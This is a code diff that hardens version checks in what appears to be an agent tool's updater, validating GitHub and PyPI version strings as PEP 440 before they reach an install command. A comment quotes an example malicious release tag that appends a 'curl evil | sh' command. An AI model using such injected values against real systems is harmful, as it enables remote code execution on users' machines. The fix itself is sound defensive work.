@@ -549,11 +549,20 @@ def _fetch_kbagent_latest_version(
         )
         response.raise_for_status()
         tag = response.json().get("tag_name", "")
-        # Strip leading 'v' from tag (e.g. 'v0.16.0' -> '0.16.0')
-        version = tag.lstrip("v")
-        if re.match(r"\d+\.\d+\.\d+", version):
-            return version
-        return None
+        # Strip a single leading 'v' (e.g. 'v0.16.0' -> '0.16.0').
+        version = tag.removeprefix("v")
+        # Validate strictly as PEP 440 before the version can flow into the
+        # install command / URL (resolve_kbagent_wheel_url /
+        # build_kbagent_upgrade_command). The old `re.match(r"\d+\.\d+\.\d+", ...)`
+        # was NOT end-anchored, so an adversarial release tag like
+        # '0.99.0; curl evil | sh' passed on its '0.99.0' prefix and reached
+        # the upgrade command (GHSA-x6cx-93j8-pgwj).
+        try:
+            Version(version)
+        except InvalidVersion:
+            logger.warning("Ignoring malformed GitHub release tag %r", tag)
+            return None
+        return version
     except (httpx.HTTPError, KeyError, ValueError):
         logger.debug("Failed to fetch latest kbagent version", exc_info=True)
         return None
@@ -616,9 +625,16 @@ def _fetch_mcp_latest_version(timeout: float = VERSION_CHECK_TIMEOUT) -> str | N
         response.raise_for_status()
         data = response.json()
         version = data.get("info", {}).get("version", "")
-        if re.match(r"\d+\.\d+\.\d+", version):
-            return version
-        return None
+        # Same end-anchoring fix as the kbagent path (GHSA-x6cx-93j8-pgwj): the
+        # MCP version flows into the MCP upgrade command, so validate it strictly
+        # as PEP 440 rather than matching a bare prefix. PyPI already enforces
+        # PEP 440, so this is defense-in-depth on the install path.
+        try:
+            Version(version)
+        except InvalidVersion:
+            logger.warning("Ignoring malformed MCP version %r from PyPI", version)
+            return None
+        return version
     except (httpx.HTTPError, KeyError, ValueError):
         logger.debug("Failed to fetch latest MCP server version", exc_info=True)
         return None
